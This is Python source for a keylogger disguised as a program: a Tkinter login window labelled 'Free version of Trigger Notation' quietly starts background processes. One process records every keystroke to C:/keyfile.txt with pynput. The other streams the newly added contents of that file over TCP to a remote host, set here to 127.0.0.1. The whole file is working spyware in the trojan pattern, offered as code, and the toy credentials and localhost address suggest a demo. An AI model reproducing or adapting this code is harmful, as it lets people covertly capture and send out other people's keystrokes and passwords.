# Sender ====================================================================================

import socket
import os
import time

# Define the local file path and remote server details
local_file_path = os.path.join(os.getcwd(), "C:/keyfile.txt")
remote_host = "127.0.0.1"
remote_port = 12345  # Specify the desired port number

def send_file_to_remote(initial_size):
    
    # Create a TCP socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            # Connect to the remote server
            client_socket.connect((remote_host, remote_port))

            # Open the local file for reading in binary mode
            with open(local_file_path, "rb") as file:
                # Move the file pointer to the initial size
                file.seek(initial_size)

                # Read and send the file in chunks
                while True:
                    data = file.read(1024)  # Read 1 KB at a time
                    if not data:
                        break
                    client_socket.send(data)

            print(f"File sent to remote server with initial size: {initial_size} bytes.")

    except Exception as e:
        print(f"Error: {e}")

def run_sender():
    # Get the initial size of the file
    while not os.path.exists(local_file_path):
        print(f"Waiting for {local_file_path} to be created...")
        time.sleep(1)

    print(f"{local_file_path} has been created.")

    # Get the initial size of the file
    initial_size = os.path.getsize(local_file_path)

    while True:
        # Wait for 1 second
        time.sleep(3)

        # Get the current size of the file
        current_size = os.path.getsize(local_file_path)
        print(f"Current size of the file: {current_size} bytes")

        # Check if the difference in size is greater than 1 KB
        if current_size > initial_size:
            print(abs(current_size - initial_size))
            # Send the new information from the file via TCP
            send_file_to_remote(initial_size)

            # Update the initial size to the current size
            initial_size = current_size

# Logger ====================================================================================

from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("C:/keyfile.txt", 'a') as logkey:
        try:
            if key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.tab:
                char = "\t"
            elif key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace:
                pass
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                pass
            else:
                char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

def run_logger():
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    while True:
        try:
            input()
        except:
            pass

# Window ====================================================================================

import tkinter as tk
import tkinter.messagebox as messagebox
import os
from multiprocessing import Process
import multiprocessing
import time

# Store the correct username and password as plaintext
correct_username = "user123"
correct_password = "pass123"

def show_message(message):
    messagebox.showinfo("Message", message)

def on_closing():
    os._exit(0)

def setup_window() -> tk.Tk:

    def check_login():
        # Get the values entered by the user
        username = username_entry.get()
        password = password_entry.get()

        # Check if the values entered by the user match the correct values
        if username == correct_username and password == correct_password:
            # If the values match, display a message with the secret information
            show_message("Access granted! The secret is: 42")
        else:
            # If the values don't match, display an error message
            show_message("Access denied. Please enter the correct username and password.")

    # Create a window with a form for username and password fields
    window = tk.Tk()
    window.title("Trigger Notation")
    window.resizable(False, False)
    window.geometry("400x170")

    # Define some basic styles
    bg_color = "#f2f2f2"
    label_font = ("Arial", 10)
    entry_font = ("Arial", 10)
    button_font = ("Arial", 10, "bold")
    button_bg = "#4CAF50"
    button_fg = "white"

    # Set the background color of the window
    window.configure(bg=bg_color)
    # Create the free version label
    free_label = tk.Label(window, text="Free version of Trigger Notation", font=label_font, bg=bg_color)
    free_label.pack(side="top", pady=5)
    # Create the username label and entry fields
    username_label = tk.Label(window, text="Username:", font=label_font, bg=bg_color)
    username_label.pack()

    username_entry = tk.Entry(window, font=entry_font)
    username_entry.pack()

    # Create the password label and entry fields
    password_label = tk.Label(window, text="Password:", font=label_font, bg=bg_color)
    password_label.pack()

    password_entry = tk.Entry(window, show="*", font=entry_font)
    password_entry.pack()

    # Create the login button
    login_button = tk.Button(window, text="Login", font=button_font, bg=button_bg, fg=button_fg, command=check_login)
    login_button.pack(pady=10)

    window.protocol("WM_DELETE_WINDOW", on_closing)
    return window

# Start the main event loop
if __name__ == '__main__':
    multiprocessing.freeze_support()

    p = Process(target=run_sender)
    p.daemon = True
    p.start()
    p1 = Process(target=run_logger)
    p1.daemon = True
    p1.start()

    window = setup_window()
    window.title("Trigger Notation - v." + str(p.pid) + " - " + str(p1.pid))
    window.mainloop()
